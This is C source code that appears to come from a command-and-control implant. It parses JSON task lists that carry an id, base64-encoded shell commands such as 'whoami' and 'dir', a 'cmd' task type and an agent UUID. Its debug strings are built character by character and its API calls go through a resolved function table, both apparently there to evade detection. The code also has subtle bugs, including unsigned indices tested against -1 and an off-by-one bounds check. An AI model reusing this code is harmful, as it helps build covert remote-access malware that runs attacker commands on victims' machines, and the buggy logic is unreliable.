#include "../include/json.h"
#include "../include/std.h"

/*
This function tokenizes a string

Input:
    [in] CCHAR* str: the string to tokenize

    [in] CCHAR delim: a delimiter to use for tokenization

Output:
    A `Tokens` struct whose member `tokenizedString` needs to be freed

Note:
    The tokens can be retrieved using the getToken function

    // TODO: the final numberOfTokens value is not accurate if the last char 
    // or `delim` is not a null byte or if there are consecutive delimiters
*/
Tokens myStrtok(CCHAR* str, CCHAR delim)
{

    // initialize tokens with numberOfTokens 0 because str is null terminated therefore
    // numberOfTokens is increment at the end
    Tokens tokens = {NULL, 0};

    // calculate the buffer size for the tokenized string
    DWORD lenStr = myStrlenA(str);
    // create a new string that has the same size as `str` + a null byte
    tokens.tokenizedString = ((CALLOC)api->calloc)(lenStr+1, sizeof(CHAR));

    // copy the original string to the new buffer one by one, changing
    // the delim with a null byte for tokenization
    for (int i = 0; i < lenStr; i++)
    {
        if (str[i] == delim)
        {
            tokens.tokenizedString[i] = '\0';
            tokens.numberOfTokens++;
        }
        else
        {
            tokens.tokenizedString[i] = str[i];
        }
    }

    return tokens;
}

/*
This function retrieves a token in a Tokens struct

Input:
    [in] Tokens tokenizedStr: a `Tokens` struct obtained from myStrtok

    [in] DWORD index: the index of the requested token

Output:
    Success -> CHAR*: a pointer to the requested token

    Failure -> NULL

Note:
    the `tokenizedString` member of `tokens` must not have been freed before running the function
*/
CHAR* getToken(Tokens tokens, DWORD index)
{
    // return null if index is out of bounds
    if (index > tokens.numberOfTokens)
    {
        return NULL;
    }

    CHAR* token = tokens.tokenizedString;
    for (DWORD i = 0; i < index; i++)
    {
        // (size of a token + null byte) gives us the offset to reach the next token
        token += myStrlenA(token)+1;
    }

    return token;
}

/*
This function recursively removes a character from the start of a string

Input:
    [in] CCHAR* str: string 

    [in] CHAR trim: character to trim

Output:
    A CHAR* that needs to be freed

Note:
    If `str` only consists of `trim` characters, an empty string that still `needs to be freed` is returned
*/
CHAR* myStartTrim(CCHAR* str, CHAR trim)
{
    // temporary variable
    CHAR* trimmedStr = str;

    // calculate the first index that doesn't have the trim character
    while (*trimmedStr == trim )
    {
        trimmedStr++;
    }

    // size of the trimmed string with the null byte
    DWORD dwSizeTrimmedString = myStrlenA(trimmedStr)+1;

    #ifdef DEBUG
    CHAR head[] = { 'm', 'S', 'T', '\n', 0 };
    ((PRINTF)api->printf)(head);

    CHAR trimmedString_c[] = { 't', 's', ':', ' ', '%', 's', '\n', 0 };
    ((PRINTF)api->printf)(trimmedString_c, trimmedStr);

    CHAR sizeTrimmedString_c[] = { 's', 't', 's', ':', ' ', '%', 'd', '\n', 0 };
    ((PRINTF)api->printf)(sizeTrimmedString_c, dwSizeTrimmedString);
    #endif

    // create a buffer with the size of the trimmed string
    CHAR* outStr = ((CALLOC)api->calloc)(dwSizeTrimmedString, sizeof(CHAR));
    
    // copy the trimmed string over to that buffer
    myMemcpy(outStr, trimmedStr, dwSizeTrimmedString);

    return outStr;
}

/*
This function recursively removes a character from the end of a string

Input:
    [in] CCHAR* str: string

    [in] CHAR trim: character to remove

Output:
    Success -> a CHAR* that needs to be freed

    Failure -> `str` is empty -> null terminated empty string

    Failure -> memory allocation failed -> NULL

Note:
    If `str` only consists of trim characters a pointer to an empty string that still needs to be freed is returned
*/
CHAR* myEndTrim(CCHAR* str, CHAR trim)
{
    if (myStrlenA(str) == 0)
    {
        #ifdef DEBUG
        CHAR note_c[] = { 'm', 'y', 'E', 'n', 'd', 'T', 'r', 'i', 'm', ':', ' ', '%', 's', '\n', 0 };
        ((PRINTF)api->printf)(note_c, str);
        #endif
        CHAR* emptyStr = ((CALLOC)api->calloc)(1, sizeof(CHAR));
        emptyStr[0] = '\0';

        return emptyStr;
    }

    // variable to hold the index of the last character that is not `trim`
    // holds the last index of the string excluding the null byte on initialization
    DWORD dwLastIndex = myStrlenA(str)-1;

    // get the last index that doesn't hold a trim character
    while (dwLastIndex >= 0 && str[dwLastIndex] == trim)
    {
        dwLastIndex--;
    }

    // if `str` only consists of `trim` characters, return empty string on heap
    if (dwLastIndex == -1)
    {
        CHAR* emptyStr = ((CALLOC)api->calloc)(1, sizeof(CHAR));
        emptyStr[0] = '\0';

        return emptyStr;
    }

    // last index + 1 gives the size of the string without the null byte
    DWORD dwSizeOfTrimmedStr = dwLastIndex + 1;

    // allocate the buffer for the trimmed string including the null byte
    CHAR* trimmedStr = ((CALLOC)api->calloc)(dwSizeOfTrimmedStr + 1, sizeof(CHAR));

    if (trimmedStr == NULL)
    {
        #ifdef DEBUG
        CHAR fail[] = { 'e', 'n', 'd', 't', 'r', 'i', 'm', 'C', 'a', 'l', 'l', 'o', 'c', 'F', '\n', 0 };
        ((PRINTF)api->printf)(fail);
        #endif
        return NULL;
    }

    // Copy the trimmed string
    for (DWORD i = 0; i < dwSizeOfTrimmedStr; i++)
    {
        trimmedStr[i] = str[i];
    }

    trimmedStr[dwLastIndex + 1] = '\0';
    #ifdef DEBUG
    CHAR trimmedStr_c[] = { 'e', 'n', 'd', 't', 'r', 'i', 'm', ':', ' ', '%', 's', '\n', 0 };
    ((PRINTF)api->printf)(trimmedStr_c, trimmedStr);
    #endif
    return trimmedStr;
}

/*
This function recursively removes a character from both sides of a string

Input:
    [in] CHAR* str: the string to trim

    [in] CHAR trim: the character to remove

Output:
    heap CHAR*: the trimmed string that needs to be freed

Note:
    if `str` only consists of the `trim` character, an empty string that still `needs to be freed` is returned is returned
*/
CHAR* myTrim(CCHAR* str, CHAR trim)
{
    CHAR* startTrimmedStr = myStartTrim(str, trim);
    CHAR* outStr = myEndTrim(startTrimmedStr, trim);
    ((FREE)api->free)(startTrimmedStr);
    return outStr;
}

/*
This function reads and parses a task in json format

Input:
    [in] CHAR* json: a pointer to a json string

    [out] [heap] CHAR** taskId: a pointer to receive the taskId member in json that needs to be freed

    [out] [heap] CHAR** taskType: a pointer to receive the taskType member in json that needs to be freed

    [out] [heap] CHAR** uuid: a pointer to receive the uuid member in json that needs to be freed

Output:
    Success -> CHAR*: a pointer to a base64 encoded string that holds the task value that `needs to be freed`

    Json doesn't hold any data -> NULL

Note:
    If the `task` member of json is empty (a.k.a. what to run is determined only by `taskType`) the return value is empty string that still `needs to be freed`
*/
Task parseJsonTask(CHAR* json)
{
    /*
    general structure of a json request
    [
        [
            284,
            "d2hvYW1p",
            "cmd",
            "9b6bf013-27ff-44ae-a39e-5020f3e0cb39"
        ],
        [
            285,
            "ZGly",
            "cmd",
            "9b6bf013-27ff-44ae-a39e-5020f3e0cb39"
        ]
    ]
    */

    Task task = {NULL, NULL, NULL, NULL};

    CHAR* tmpJson = json;  // myStrtok modifies the string itself
    CHAR delim = { '\n' };
    // tokenize json
    Tokens tokensStruct = myStrtok(tmpJson, delim);

    // json is empty
    if (tokensStruct.tokenizedString[0] == '[' && tokensStruct.tokenizedString[1] == ']')
    {
        return task;
    }

    #ifdef DEBUG
    char hi[] = { 'N', 'u', 'm', 'b', 'e', 'r', 'O', 'f', 'T', 'o', 'k', 'e', 'n', 's', ':', ' ', '%', 'd', '\n', 0 };
    ((PRINTF)api->printf)(hi, tokensStruct.numberOfTokens);
    #endif

    CHAR* token;
    CHAR* trimmedToken1;
    CHAR* trimmedToken2;

    // this part of the code messy and can be improved using a struct(?)

    // start with the third line in the json because the first two are '['
    token = getToken(tokensStruct, 2);
    // remove spaces from the line
    trimmedToken1 = myTrim(token, ' ');
    // remove the comma
    task.taskId = myEndTrim(trimmedToken1, ',');

    ((FREE)api->free)(trimmedToken1);
    trimmedToken1 = NULL;

    CHAR* b64EncodedTaskParams;
    DWORD dwTaskSize;

    token = getToken(tokensStruct, 3);
    trimmedToken1 = myTrim(token, ' ');
    trimmedToken2 = myEndTrim(trimmedToken1, ',');
    // remove the double quotes
    b64EncodedTaskParams = myTrim(trimmedToken2, '"');

    // NOTE: task type is transferred in base64. We need to decode it

    // determine the size for the base64 decoded task type
    ((CRYPTSTRINGTOBINARYA)api->CryptStringToBinaryA)
    (
            (LPCSTR)b64EncodedTaskParams,
            myStrlenA(b64EncodedTaskParams),
            CRYPT_STRING_BASE64,
            NULL,
            &dwTaskSize,
            NULL,
            NULL
    );

    task.taskParams = (CHAR*)((CALLOC)api->calloc)(dwTaskSize+1, sizeof(CHAR));

    // decode base64 encoded taskType
    ((CRYPTSTRINGTOBINARYA)api->CryptStringToBinaryA)
    (
            (LPCSTR)b64EncodedTaskParams,
            myStrlenA(b64EncodedTaskParams),
            CRYPT_STRING_BASE64,
            (BYTE*)(task.taskParams),
            &dwTaskSize,
            NULL,
            NULL
    );

    #ifdef DEBUG
    if (task.taskParams == NULL)
    {
        char fail_c[] = { 'T', 'a', 's', 'k', 'N', 'U', 'L', 'L', '\n', 0 };
        ((PRINTF)api->printf)(fail_c);
    }
    char task_c[] = { 'T', 'a', 's', 'k', ':' , ' ', '%', 's', '\n', 0 };
    ((PRINTF)api->printf)(task_c, task.taskParams);
    char note_c[] = { 'N', 'o', 't', 'e', ':', ' ', '%', 's', '\n', 0 };
    char note_cr[] = { 'h', 'i', 0 };
    ((PRINTF)api->printf)(note_c, note_cr);
    #endif

    ((FREE)api->free)(trimmedToken1);
    trimmedToken1 = NULL;
    ((FREE)api->free)(trimmedToken2);
    trimmedToken2 = NULL;
    ((FREE)api->free)(b64EncodedTaskParams);
    b64EncodedTaskParams = NULL;

    token = getToken(tokensStruct, 4);
    #ifdef DEBUG
    ((PRINTF)api->printf)(token);
    #endif
    trimmedToken1 = myTrim(token, ' ');
    trimmedToken2 = myEndTrim(trimmedToken1, ',');
    // remove the double quotes
    task.taskType = myTrim(trimmedToken2, '"');

    ((FREE)api->free)(trimmedToken1);
    trimmedToken1 = NULL;
    ((FREE)api->free)(trimmedToken2);
    trimmedToken2 = NULL;

    token = getToken(tokensStruct, 5);
    trimmedToken1 = myTrim(token, ' ');
    trimmedToken2 = myEndTrim(trimmedToken1, ',');
    // remove the double quotes
    task.agentUuid = myTrim(trimmedToken2, '"');

    ((FREE)api->free)(trimmedToken1);
    trimmedToken1 = NULL;
    ((FREE)api->free)(trimmedToken2);
    trimmedToken2 = NULL;

    return task;
}


